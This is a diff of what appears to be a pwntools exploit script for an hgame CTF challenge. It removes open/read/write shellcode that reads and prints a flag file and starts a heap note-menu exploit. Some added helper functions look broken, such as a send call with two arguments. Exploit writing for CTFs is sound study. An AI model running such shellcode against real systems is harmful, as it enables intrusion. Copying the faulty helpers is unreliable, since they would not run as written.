@@ -11,7 +11,7 @@ if debug:
     r = process("./vuln")
 else:
     host = "week-1.hgame.lwsec.cn"
-    r = connect(host,30153)#远程连接
+    r = connect(host,30709)#远程连接
     gdb_is =0
 # elf = cdll.LoadLibrary('libc.so.6')
 # elf = ELF('./pwn')
@@ -21,37 +21,22 @@ if gdb_is:
     pause()
     pass
 
-payload = asm(
-    '''
-xor rdi,rdi
-mov rsi,rdx
-add rsi,12
-syscall
-    '''
-)
+def add_note(page , size):
+    r.sendlineafter(b'Index:', page)
+    r.sendlineafter(b'Size:', size)
+
+def delete_note(page):
+    r.sendlineafter(b'Index:', page)
+
+def edit_note(page , content):
+    r.sendlineafter(b'Index:', page)
+    r.send(b'Content:' , content)
+
+def show_note(page):
+    r.sendlineafter(b'Index:', page)
+
+add_note(0,-1)
+add_note(1,-1)
 
 
-r.sendafter(b'shellcode:',payload)
-sleep(1)
-
-shellcode = asm('''
-    push 0x67616c66
-    mov rdi,rsp
-    xor esi,esi
-    push 2
-    pop rax
-    syscall
-    mov rdi,rax
-    mov rsi,rsp
-    mov edx,0x100
-    xor eax,eax
-    syscall
-    mov edi,1
-    mov rsi,rsp
-    push 1
-    pop rax
-    syscall
-    ''')
-r.send(shellcode)
-# print(r.recvuntil(b'}'))
 r.interactive()
